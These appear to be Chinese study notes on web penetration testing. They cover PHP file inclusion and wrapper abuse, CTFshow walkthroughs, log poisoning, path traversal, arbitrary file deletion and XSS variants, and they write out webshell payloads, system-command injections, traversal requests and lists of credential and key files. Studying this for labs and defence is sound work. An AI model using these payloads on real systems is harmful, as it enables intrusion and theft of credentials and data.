Include-RFI差异原因：代码过滤和环境配置文件开关决定\n环境配置\n\n找到对应的小皮PHP设置中的远程包含并开启或者在对应&#x3D;&#x3D;网址服务的PHP版本下找到php.ini文件，并将allow_url_include&#x3D;Off改为On即可&#x3D;&#x3D;\n\n\n\n\n通过远程服务，创建file.txt内容为&lt;?php phpinfo();?&gt; ，并使用远程包含，将对应文件地址替换为远程创建的文件的ip访问地址即可\n\n\n\n\n5、白盒审计：（CTFSHOW）\n白盒发现：1、可通过应用功能追踪代码定位审计2、可通过脚本特定函数搜索定位审计3、可通过伪协议玩法绕过相关修复等\n\n\nPHP：include、require、include_once、require_once等PHP：include、require、include_once、require_once等 “”” PHP：include、require、include_once、require_once 等\ninclude在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行require函数出现错误的时候，会直接报错并退出程序的执行Java：java.io.File、java.io.FileReader等Java：java.io.File、java.io.FileReader等 Java：java.io.File、java.io.FileReader等 翻译为： Java：java.io.File、java.io.FileReader 等 （注：这里“等”字加不加均可，英文原文“等”字没有对应词，翻译习惯上可加“等”字使表述更自然）\nASP.NET：System.IO.FileStream、System.IO.StreamReader等\n\n6、黑盒分析：黑盒发现：主要观察参数传递的数据和文件名是否对应URL中有path、dir、file、pag、page、archive、p、eng、语言文件等相关字眼\n7、利用有文件利用：上传一个文件 文件写有我们的恶意代码（配合文件上传）\n无文件利用：\n1.包含日志文件利用\n2.包含session文件利用\n3.伪协议玩法利用\n​\t\t\t\t\t\tphp:&#x2F;&#x2F;input与data:&#x2F;&#x2F;都需要开启allow_url_include才能使用\n\n参考：https://blog.csdn.net/unexpectedthing/article/details/121276653\n本地利用思路文件读取1、file:&#x2F;&#x2F;&#x2F;d:&#x2F;1.txt，读取d盘下的1.txt文件内容**（需要使用绝对路径）**\n\nhttp://192.168.232.195/demo01/include.php?file=file:///d:/1.txt\n\n\n2、php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1.php读取名为1.php的文件**（当前网址存放源码目录下），并将其内容以base64编码的形式返回。（相对路径）**\n\nPD9waHAgcGhwaW5mbygpOz8+通过解码后是\n\n\n文件写入1、http://192.168.232.195/demo01/include.php?file=php://input在Post data中写入&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;成功写入文件并可以访问执行\n\n\n\n\n\n\n\n\n\n2.http://192.168.232.195/demo01/include.php?file=php://filter/write=convert.base64-encode/resource=phpinfo.php\n在Post data中写入content&#x3D;131成功写入文件并可以访问执行\n\nfile_put_contents($_GET[&#39;file&#39;],$_POST[&#39;content&#39;]); 使用该方式执行文件写入，必须要在代码中有这个才可以\n$_GET[&#39;file&#39;]: 通过GET请求传递的**file**参数，用于指定要写入内容的文件路径。这可能包含相对或绝对路径，具体取决于如何使用该代码\n$_POST[&#39;content&#39;]: 通过POST请求传递的**content**参数，用于指定要写入到文件中的内容。这是用户提供的数据，可以是任何字符串\n该代码的主要目的是将通过POST请求传递的内容写入指定的文件。\n\n\n\n\n\n\n\n\n\n\n\n\n\n代码执行1、http://192.168.74.195/demo01/include.php?file=php://input在Post data中写入\n\n\n\n2、http://192.168.74.195/demo01/include.php?file=data://text/plain,在plain,后面加上你所要执行的代码\n进行base64编码后也能执行PD9waHAgcGhwaW5mbygpOz8%2B\n\nhttp://192.168.74.195/demo01/include.php?file=data://text/plain,PD9waHAgcGhwaW5mbygpOz8%2B\n\n\n\n\n伪协议的使用有条件限制 使用的时候及时观察一下\n\n远程文件包含\n\n直接搭建一个可访问的远程URL包含文件\n\n找到对应的小皮PHP设置中的远程包含并开启或者在对应&#x3D;&#x3D;网址服务的PHP版本下找到php.ini文件，并将allow_url_include&#x3D;Off改为On即可&#x3D;&#x3D;\n\n通过远程服务，创建file.txt内容为 ，并使用远程包含，将对应文件地址替换为远程创建的文件的ip访问地址即可\n\n通过哥斯拉连接后门，成功获取权限\n\n\n\n\n\n#黑盒利用-VULWEB-有无包含文件漏洞环境\nhttp://testphp.vulnweb.com/showimage.php?file=showimage.php&amp;size=160\n漏洞复现\n\n使用burpsuite抓包 发送到repeter里面 \n将?file&#x3D;后面的showimage.php修改为index.php发现存在包含并且爆出数据库配置文件database_connect.php\n\n接下来继续修改尝试包含database_connect.php\n爆出数据库 本地 账号 密码\n\n\n#白盒利用-CTFSHOW-伪协议玩法 靶场地址：https://ctf.show/challenges\n78-php&amp;http协议\n代码给出include文件包含的关键词\n\n由于是无文件上传，所以使用无文件支持伪协议利用\n\n两种方法\n\n第一种直接通过文件读取**（相对路径）php://filter/read=convert.base64-encode/resource=flag.php读取名为flag.php的文件（当前网址存放源码目录下）**，并将其内容以base64编码的形式返回，并通过解密拿到flag。\n\n第二种：使用文件执行\n\n?file=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt; 可以获取当前目录文件发现有一个flag.php\n\n?file=data://text/plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt; 即可读取flag.php的中的内容\n\nsystem函数执行tac命令，该命令用于反向输出文件内容（以行为单位）。在这里，它尝试反向输出flag.php文件的内容。如果flag.php**文件存在并可读，那么该文件的内容将被反向显示\n\n\n\n\n\n\n\n\n\n\n\n\n\n79-data&amp;http协议\n代码这里是关于include文件包含的关键词\n由于是无文件上传，所以使用无文件支持伪协议利用\n发现代码对php关键词过滤\n在PHP中，&lt;?= ... ?&gt; 是短标签（short tags）的一种形式，用于简洁地输出内容，等同于 &lt;?php echo ... ?&gt;。而 &lt;?php ... ?&gt; 是标准的PHP起始和结束标记\n两种方法\n将文件执行中，直接去掉php关键词，依旧可以正常执行\n?file=data://text/plain,**&lt;?=system(&#39;ls&#39;);?&gt;** 可以获取当前目录文件发现有一个flag.php\n?file=data://text/plain,**&lt;?=system(&#39;tac flag*&#39;);?&gt;** 即可读取flag.php的中的内容。成功获取到flag\n\n\n使用文件执行，将数据流协议（data://）和base64编码的方式，将PHP代码嵌入URL中\ndata:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==\n解码为：\n\n\n\n\n\n\n\n\n\n80 81-日志包含\n利用其他协议,如file,zlib等\n\n利用日志记录UA特性包含执行\n\n\n\n分析需文件名及带有php关键字放弃，故利用日志记录UA信息，UA带入代码包含：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log\n\n\n代码给出include文件包含的关键词\n由于是无文件上传，所以使用无文件支持伪协议利用\n代码对php关键词和data关键词过滤\n两种方式\n\n\n第一种，使用文件执行PHP:&#x2F;&#x2F;input，并使用大小写绕过其对php的过滤\n?file=PHP://input POST data：&lt;?=system(&#39;ls&#39;);?&gt;**中写上对应的去掉PHP关键词php语句即可\n**?file=PHP://input POST data：&lt;?=system(&#39;tac fl0g.\\*&#39;);?&gt;*中写上对应的去掉PHP关键词php语句，和*文件匹配的后缀，更改为*号绕过检测\n\n\n第二种使用：日志记录文件包含，利用日志记录UA信息，UA带入代码\n使用文件读取：**file:///var/log/nginx/access.log**读取对应的日志文件内容（绝对路径），成功读取\n通过抓包，抓取到数据包，发送至repeater，并尝试修改UA头中的内容，修改成功，于是尝试在UA头中写入恶意代码\nUser-Agent: 222222222&lt;?php=system(&#39;ls&#39;)?&gt;并发送数据包，成功写入，并被解析fl0g.php index.php\nUser-Agent: 333333333&lt;?php system(&#39;tac fl0g.php&#39;)?&gt;并发送数据包，成功写入，并被解析\n\n\n\n\n\n\n\n\n\n\n\n\n\n87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码（文件写入，二次解密）一、利用base64\n\n正常来讲，浏览器会默认执行URL解码一次，但是提供代码中又加入了一次urldecode($file)，二次解码，造成之前的过滤失效\nurl编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;123.php\nPost data:写入&#x3D;&#x3D;content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs&#x2F;Pg&#x3D;&#x3D;解码为&lt;?php @eval($_POST[a]);?&gt;\n通过访问，创建木马文件123.php\n并通过输入Post data：写入a&#x3D;system(’ls’);\n并通过输入Post data：写入a&#x3D;system(‘tac fl0g.php’);\n\n\n%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%33%32%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30\n\n\n\n\n\n\n\n二、利用凯撒13\n\nurl编码2次：php://filter/write=string.rot13/resource=2.php\nPost data:写入&#x3D;&#x3D;content&#x3D;&#x3D;&#x3D;\nROT13解密：（木马设置的密码为：1）\n通过访问，创建木马文件2.php\n并通过输入Post data：写入1&#x3D;system(’ls’);\n并通过输入Post data：写入1&#x3D;system(‘tac fl0g.php’);\n\n\n%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%32%25%32%45%25%37%30%25%36%38%25%37%30\n\n\n\n\n\n\n88-data&amp;base64协议\n过滤PHP，各种符号，php代码编码写出无符号（+和&#x3D;）base64值\nPayload：file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk\n解密：ad**（为了去掉+和&#x3D;）\n直接写，会出现被过滤的号&#x3D;&#x3D;\n\n\n\n117-php:&#x2F;&#x2F;filter&#x2F;write\n这里可以看到把将众多编码形式做了过滤包括 http, https, utf, zlib, data, input, rot13, base64, string, log, sess，不区分大小写（i 标志）。\n\nconvert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用\n\nPayload：file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php\nPost data 中写入：**contents=**?&lt;hp pvela$(P_SO[T]a;)&gt;?\n解码为：（木马设置的密码为：a）\n通过访问，创建木马文件a.php\n并通过输入Post data：写入a&#x3D;system(’ls’);\n并通过输入Post data：写入a&#x3D;system(‘tac flag.php’);\n\n&lt;?php/* 将字符串 &#x27;&lt;?php eval($_POST[a]);?&gt; 从 UCS-2LE 编码转换为 UCS-2BE 编码*/$result = iconv(&quot;UCS-2LE&quot;, &quot;UCS-2BE&quot;, &#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);echo &quot;经过一次反转:&quot;.$result.&quot;\\n&quot;;//经过一次反转:?&lt;hp pvela$(P_SO[T]a;)&gt;?// 将经过一次编码转换后的字符串再次从 UCS-2LE 编码转换为 UCS-2BE 编码echo &quot;经过第二次反转:&quot;.iconv(&quot;UCS-2LE&quot;, &quot;UCS-2BE&quot;, $result);//经过第二次反转:&lt;?php eval($_POST[a]);?&gt;?&gt;\n\n\n\n\n\n参考文章：文件包含漏洞+php伪协议\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"051-Web攻防-文件安全&目录安全&测试源码等","url":"/2025/09/16/051-Web%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8&%E7%9B%AE%E5%BD%95%E5%AE%89%E5%85%A8&%E6%B5%8B%E8%AF%95%E6%BA%90%E7%A0%81%E7%AD%89/","content":"051-Web攻防-文件安全&amp;目录安全&amp;测试源码等知识点\n1、文件安全-前后台功能点-下载&amp;读取&amp;删除2、目录安全-前后台功能点-目录遍历&amp;目录穿越\n\n演示案例：\n➢文件安全-下载&amp;删除-案例黑白盒➢目录安全-遍历&amp;穿越-案例黑白盒\n\n#文件安全-下载&amp;删除-黑白盒1、下载&#x3D;读取（获取源码）文件下载利用：下载敏感文件（数据库配置，中间件配置，系统密匙等文件信息）\n\n常规下载URL：https://67.202.70.133/files/readfile.php\n（直接访问，会被默认以php执行文件解析，不能下载到本地，也不能看到源码）\n\n可能存在安全URL：https://67.202.70.133/files/readfile.php?file=readfile.php\n(下载协议下载php文件 ，源码被下载至本地可以被看到)\n\nhttps://67.202.70.133/files/readfile.php?file=…/index.php\nhttps://67.202.70.133/files/readfile.php?file=…/configuration.php\n依次下载index.php主页文件，根据源码泄露信息，确定&#x3D;&#x3D;joomle搭建的&#x3D;&#x3D;\n查找Joomle默认的数据库配置文件，并&#x3D;&#x3D;进行下载configuration.php，发现泄露数据库密码用户名等隐私信息&#x3D;&#x3D;\n\n\n\n\n\n\n\n文件读取1.常见铭感信息路径\n\nwindows系统\nC:\\boot.ini //查看系统版本C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件C:\\Windows\\repair\\sam //存储系统初次安装的密码C:\\Program Files\\mysql\\my.ini //Mysql配置C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql rootC:\\Windows\\php.ini //php配置信息C:\\Windows\\my.ini //Mysql配置信息\n\n\n\nlinux系统\n/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥/root/.ssh/known_hosts//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。/etc/passwd // 账户信息/etc/shadow // 账户密码文件/etc/my.cnf //mysql 配置文件/etc/httpd/conf/httpd.conf // Apache配置文件/root/.bash_history //用户历史命令记录文件/root/.mysql_history //mysql历史命令记录文件/proc/self/fd/fd[0-9]*(文件标识符)/proc/mounts //记录系统挂载设备/porc/config.gz //内核配置文件/var/lib/mlocate/mlocate.db //全文件路径/porc/self/cmdline //当前进程的cmdline参数\n\n文件读取漏洞环境复现靶场环境\n\nhttps://portswigger.net/web-security/all-labs靶场网址 点进去找到Lab: File path traversal, simple case进入 \n需要注册账号 使用谷歌账号\n\n漏洞复现\n\n访问实验室开启靶场\n选中图片复制图片地址 新建网页打开https://0ade00380390f63f81b3892400de00f4.web-security-academy.net/image?filename=7.jpg\n替换文件名 发现参数可控 \n打开burpsuite 对访问图片地址进行抓包 发送至repeter处 修改其头文件 GET &#x2F;image?filename=../../../etc/passwd HTTP&#x2F;2\n返回包显示 账户信息\n\n\n2、文件删除（常出现后台中-危险操作）可能存在安全问题：前台或后台有删除功能应用利用：常规删除重装锁定配合程序重装或高危操作\n漏洞环境\n使用海洋cms\n安装教程参考 [海洋CMS新手入门安装配置教程][https://zhuanlan.zhihu.com/p/112764229]\n注意安装的时候后台的管理地址一定要记住 每个人的后台网址都不一样\n漏洞复现\n\n在seacms&#x2F;install&#x2F;下面有一个install_lock.txt**(如果报错检查install目录下面是否存在index.php文件)** 如果访问一个目录而该目录下没有首页文件（如 index.php），如果服务器禁止了目录浏览（默认是禁止的）服务器就不知道展示什么，默认会拒绝访问并返回 403。\n\n访问seacms的后台页面 点击模板 新建链接 (http://seacms:84/cexjwc/)抓包 发送至 repeter\n\n\n\n\n\n\n\n想要删除install_lock.txt文件 要通过加减../试探文件所在的位置\n\n最后试探为：GET &#x2F;gws3vo&#x2F;admin_template.php?action&#x3D;del&amp;filedir&#x3D;../templets../../install/install_lock.txt HTTP&#x2F;1.1\n\n该操作极度危险 请勿在实验演示\n\n\n\n\n\n\n#目录安全-遍历&amp;穿越-黑白盒1、目录遍历什么是目录便利:\n目录权限控制不当，通过遍历获取到有价值的信息文件去利用\n目录遍历出现原因\n\n如果访问一个目录而该目录下没有首页文件（如 index.php），并且服务器禁止了目录浏览（默认是禁止的）这个时候服务器就不知道展示什么，默认会拒绝访问并返回 403。\n但是如果开启了索引如果访问的目录中没有默认的索引文件（如index.html、index.php等），服务器会列出目录中的文件和子目录，以供浏览器访问 这样的配置可能会 暴露目录结构和文件列表，从而使攻击者更容易发现潜在的目标和漏洞。\n\n目录遍历的危害\n\n通过遍历获取到有价值的信息文件，然后利用它们可能是攻击者的一种常见策略。攻击者可能会查找敏感信息文件，如&#x3D;&#x3D;配置文件、日志文件、数据库备份等，&#x3D;&#x3D;并尝试利用这些文件获取进一步的访问权限或执行其他攻击。\n\n如何找目录遍历\n\n通过：FOFA：&quot;index of /&quot; &amp;&amp; title==&quot;Index of /&quot; &amp;&amp; country=&quot;CN”语句查询，可以查出很多存在目录遍历的漏洞网址\n\n2、目录穿越（常出现后台中）目录权限控制不当，通过控制查看目录路径穿越到其他目录或判断获取价值文件再利用\n\n程序对用户输入的路径参数没有严格过滤，导致攻击者可以通过 ../ 这种相对路径“往上跳”目录\n\n源码进行了限制 ，只能到default及以下包含目录\n\n\n\n点击 default 访问 新建连接访问 并尝试通过&#x3D;&#x3D;增加减少（…&#x2F;）&#x3D;&#x3D;进行目录穿越。可以访问到未经过容许的目录\n\n\n\n\n\n#黑盒分析：\n1、功能点文件上传，文件下载，文件删除，文件管理器等地方\n2、URL特征文件名：download，down，readfile，read，del，dir，path，src，Lang等参数名：file、path、data、filepath、readfile、data、url、realpath等\n\n#白盒分析：查看源码中是否存在：上传类函数，删除类函数，下载类函数，目录操作函数，读取查看函数等\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"052-Web攻防-XSS-Demo源码&小皮面板安装包等","url":"/2025/09/16/052-Web%E6%94%BB%E9%98%B2-XSS-Demo%E6%BA%90%E7%A0%81&%E5%B0%8F%E7%9A%AE%E9%9D%A2%E6%9D%BF%E5%AE%89%E8%A3%85%E5%8C%85%E7%AD%89/","content":"052-Web攻防-XSS-Demo源码&amp;小皮面板安装包等\n#知识点：1、XSS跨站-输入输出-原理&amp;分类&amp;闭合2、XSS跨站-分类测试-反射&amp;存储&amp;DOM\n演示案例：➢XSS跨站-输入输出-原理&amp;分类&amp;闭合➢XSS跨站-分类测试-反射&amp;存储&amp;DOM\n#XSS跨站-输入输出-原理&amp;分类&amp;闭合漏洞原理：\n接受输入数据，输出显示数据后解析执行\nXSS漏洞类型：\n反射(非持续)，存储(持续)，DOM-BASE\n拓展类型：jquery，mxss，uxss，pdfxss，flashxss，上传xss等常用标签：https://www.freebuf.com/articles/web/340080.html攻击利用：盲打，COOKIE盗取，凭据窃取，页面劫持，网络钓鱼，权限维持等安全修复：字符过滤，实例化编码，http_only，CSP防护，WAF拦截等测试流程：看输出想输入在哪里，更改输入代码看执行（标签，过滤决定）\n\n\n\n1.反射性xss常见情况是攻击者通过&#x3D;&#x3D;构造一个恶意链接的形式&#x3D;&#x3D;，诱导用户传播和打开，由于链接内所携带的参数会回显于页面中或作为页面的处理数据源，最终造成XSS攻击。\n简单案例\n\n设置x值为什么，相应就会解析执行什么\n\n利用嵌套js格式，生成嵌套网址：http://demo01/xss/xss.php?x=test\n\n如果这段代码被插入到一个网页中，并且该网页的用户受到攻击者的控制，那么该用户的浏览器将加载 http://www.xiaodi8.com 这个地址，并在页面中嵌入一个 &lt;iframe&gt; 元素，显示该地址的内容。\n\n那么就可能导致跨站脚本攻击。攻击者可能会尝试利用这种方式来&#x3D;&#x3D;窃取用户的信息、劫持用户会话，或者进行其他恶意活动。&#x3D;&#x3D;\n\n\n\n\n需要注意的问题：\n\n真实的XSS攻击语句，需要考虑输入和输入的格式\n\n输入可能会有过滤，输出可能会有其他符号的拼接造成攻击语句执行失败\n\n可能会造成如下的：攻击语句存在导致格式问题不能被正常解析和执行\n\n\n\n\n\n解决方式：使用特定的语句进行替换，如**x onerror&#x3D;”alert(1)”**如果你将 onerror&#x3D;”alert(1)” 嵌入到某个 HTML 元素中，那么当该元素加载失败时（例如图像加载失败、脚本加载失败等），JavaScript 中的 alert(1) 将会被执行，弹出一个带有 “1” 的警告框。\n\n​    \n\n\n\n\n2.反射性xss存储型XSS是持久化的XSS攻击方式， 将恶意代码存储于服务器端，当其他用户再次访问页面时触发，造成XSS攻击。\n简单案例\n\n访问本地搭建的留言板功能http://demo01/xss/xss.php?gbook.php\n将xss攻击写入在用户名处&#x3D;&#x3D;：&lt;script&gt;alert(1)&lt;/script&gt;&#x3D;&#x3D; 内容随便填写，然后提交\n再次访问页面的时候，都会弹出1的提示框，说明xss攻击成功\n\n\n3.DOM-base型XSS通过修改原始的客户端代码，受害者浏览器的DOM环境改变，导致有效载荷的执行。页面本身没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面并执行。\n\n寻找可操纵的DOM元素： 攻击者会寻找页面上的DOM元素，例如URL参数、cookie、用户输入等，这些DOM元素的值可能会被动态地嵌入到页面中。\n构造恶意载荷： 攻击者通过在寻找到的DOM元素中注入恶意代码，构造出一个特殊的输入值。这个输入值在后续被浏览器解释执行时，将导致恶意代码执行。\n修改DOM环境： 攻击者通过修改DOM元素的值，或者在页面中插入特殊的HTML或脚本标签，改变了原始的DOM环境。\n触发和执行： 当页面加载或用户与页面交互时，浏览器解析修改后的DOM环境，执行了包含恶意代码的DOM元素，导致攻击生效。\n\n简单案例\n\n创建domxss环境\n\n通过URL访问该页面http://192.168.137.1:84/domxss.html#https://www.baidu.com)并在**#后面跟上，想要跳转的页面，访问即可成功跳转**\n\n&lt;!-- \n    dom-xss-test 页面\n    \n    1. 设置页面标题为 &quot;dom-xss-test&quot;。\n    2. 引入 jQuery 库，版本为 1.6.1。\n    3. 利用 JavaScript 检查当前 URL 的哈希部分。\n    4. 如果存在哈希部分，提取其中的 URL，并将页面重定向到该 URL。\n--&gt;\n\n&lt;html&gt;\n&lt;head&gt;\n    &lt;!-- 设置页面标题 --&gt;\n    &lt;title&gt;dom-xss-test&lt;/title&gt;\n    \n    &lt;!-- 引入 jQuery 库 --&gt;\n    &lt;script src=&quot;https://code.jquery.com/jquery-1.6.1.min.js&quot;&gt;&lt;/script&gt;\n    \n    &lt;script&gt;\n        // JavaScript 代码\n        var hash = location.hash;\n        \n        // 如果 URL 中有哈希部分\n        if(hash)&#123;\n            // 提取 URL\n**//hash.substring(1): 对 hash 字符串调用 substring(1) 方法。\n//substring 方法用于提取字符串的一部分，参数为开始索引。\n//在这里，从索引 1 开始提取，即去掉了 # 号。**\n            var url = hash.substring(1);\n            \n            // 重定向页面到提取的 URL\n            location.href = url;\n        &#125;\n    &lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;!-- 页面主体内容 --&gt;\n    dom xss test.\n&lt;/body&gt;\n&lt;/html&gt;\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"053-Web攻防-XSS-PDF&SWF&SVG等环境工具","url":"/2025/09/16/053-Web%E6%94%BB%E9%98%B2-XSS-PDF&SWF&SVG%E7%AD%89%E7%8E%AF%E5%A2%83%E5%B7%A5%E5%85%B7/","content":"053-Web攻防-XSS-PDF&amp;SWF&amp;SVG等环境工具知识点：\n1、XSS跨站-MXSS&amp;UXSS2、XSS跨站-SVG制作&amp;配合上传3、XSS跨站-PDF制作&amp;配合上传4、XSS跨站-SWF制作&amp;反编译&amp;上传\n\n演示案例：\n➢MXSS&amp;UXSS-CVE-2021-34506➢SVG&amp;PDF&amp;SWF-XSS&amp;上传&amp;反编译\n\nSVG-XSS\nSVG(Scalable Vector Graphics)是一种基于&#x3D;&#x3D;XML的二维矢量图格式，&#x3D;&#x3D;和我们平常用的jpg&#x2F;png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。\n创建SVG格式的图片，并在源代码中加入**&lt;script&gt;alert(1)&lt;/script&gt; xss弹窗代码，当访问打开此文件时候，自动弹出弹窗**\n\n\n\n\nSVG如何配合文件上传实现跨站攻击\n我们将文件上传到https://up.ly93.cc/ 显示格式不支持上传 点击查看详情 F12查看源代码\ndata:image&#x2F;svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCI+CiAgPGNpcmNsZSBjeD0iMjUiIGN5PSIyNSIgcj0iMjAiIGZpbGw9InJlZCI+PC9jaXJjbGU+CiAgPHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4KPC9zdmc+Cg&#x3D;&#x3D;  这里使用了固定格式将图片编码进行了base64编码 因为这里不支持svg格式所以没有直连地址 我们访问这个编码 依旧能弹出\n\n\n\n\nPDF-XSS\n首先本地得有一个关于PDF的编辑器 什么都可以 我这里是 福昕PDF编辑器\n点击左上角文件 - 创建 - 空白页- 点击缩略图 - 右键点击属性 - 选选择 页面打开 - 选择动作为运行一段JavaScript脚本 -点击添加脚本 app.alert(1)  最后保存到本地为xss.pdf\n打开浏览器访问pdf文件 在之前那个网站上传pdf文件\n上传成功首会出现直连的url地址 访问就出现了弹窗\n \n\n\n\n\n\n\n\n遇到的问题\n\n在编辑代码的时候发现使用app.alert(xss)不能执行 在表单 JavaScript控制台显示未定义 解决方法：不使用xss 使用1等其他字符\n不能直接把本地的文件拖到浏览器打开 得点击文件右键 选择打开方式 选择浏览器才能出现弹窗\n\nFLASH-XSS\n在本地下载一个Adobe Flash CS6 https://www.downza.cn/soft/27510.html\n\n制作swf-xss文件：\n\n新建文件 选择动画  随机缓动的运动 常规选择2.0\nF9进入代码区域\n\n//取m参数var m=_root.m;//调用html中Javascript中的m参数值flash.external.ExternalInterface.call(m);\n\n\n属性发布设置解析 选择action script 1.0&amp;2.0 输入代码 ctrl+ 回车 图片不报错且正常运行 成功 发布设置 发布脚本要选择 action2.0 点击发布 选择文件保存地址\n将发布在桌面&#x3D;&#x3D;（创建好的携带Xss攻击的swf文件），存放在部署好的网址源码下，并进行访问。使用触发Xss触发语句，成功弹窗弹出Xss攻击弹窗&#x3D;&#x3D;\n\n\n\n\n\n\n\n\n\nxss-swf文件安全性\nxss一是指执行恶意js，那么为什么说flash xss呢？是&#x3D;&#x3D;因为flash有可以调用js的函数，也就是可以和js通信，因此这些函数如果使用不当就会造成xss。常见的可触发xss的危险函数有：getURL，navigateToURL，ExternalInterface.call，htmlText，loadMovie&#x3D;&#x3D;等等 项目：JPEXS Free Flash Decompiler\n通过FOFA语句：“phpwind” &amp;&amp; icon_hash&#x3D;”-1005349246”可以查找到许多存在Flash反编译安全性的网址\n通过目录扫描：https://www.acg-123.org**/images/uploader.swf 发现对应的目录位置**\n\n\n1.利用JPEXS Free Flash Decompiler工具，反编译swf文件\n\n2.查找触发危险函数，**在AS源码中，使用ctrl+F全局搜索关键词，**例如&#x3D;&#x3D;**getURL，navigateToURL，ExternalInterface.call，htmlText，loadMovie**&#x3D;&#x3D;\n\n\n\n\n\n3.将反编译的文件放到本地部署好的网址源码目录下面 根据分析的点使用jsobject，进行xss攻击\n\nMXSS：参考文章：https://www.fooying.com/the-art-of-xss-1-introduction/\n什么是mxss？\nmXSS中文是突变型XSS，指的是&#x3D;&#x3D;原先的Payload提交是无害不会产生XSS，而由于一些特殊原因，如反编码等，导致Payload发生变异，导致的XSS。&#x3D;&#x3D;下面的漏洞是存在于以前版本的PC的QQ客户端的页面预览功能。\n\n\n\n上图是在QQ客户端里分享上面的博客园那篇文章的链接，而&#x3D;&#x3D;QQ存在网址预览功能，于是点击网址可以在右侧显示出优化后的页面的内容，就导致了XSS的产生；&#x3D;&#x3D;这个预览功能实际上是QQ客户端内嵌了一个网页，这个页面对原网页内容进行提取和处理的过程中，将原本无害的XSS Payload进行了转码操作，于是导致了Payload 变异而产生了XSS，我记得这个XSS，我前后一共绕过了三四次，然后提交给了TSRC。\n实际上，页面预览这个功能不是针对所有网址都可以预览，对于一些大型的网站，估计是有白名单机制或者是认证的网站，才能进行预览，随便一个网址是不可以的，这本身也是一种信任的限制在里面，如果是随意的网站，那就更好控制内容了，所以对于域名是有限制的；这里也存在一个信任的问题，理论上，这些大站的内容应该是没问题的，但实际情况是可被控制而导致产生XSS。\n\nUXSS：Universal Cross-Site Scripting\nUXSS是&#x3D;&#x3D;利用浏览器或者浏览器扩展漏洞&#x3D;&#x3D;来制造产生XSS并执行代码的一种攻击类型。\nMICROSOFT EDGE uXSS 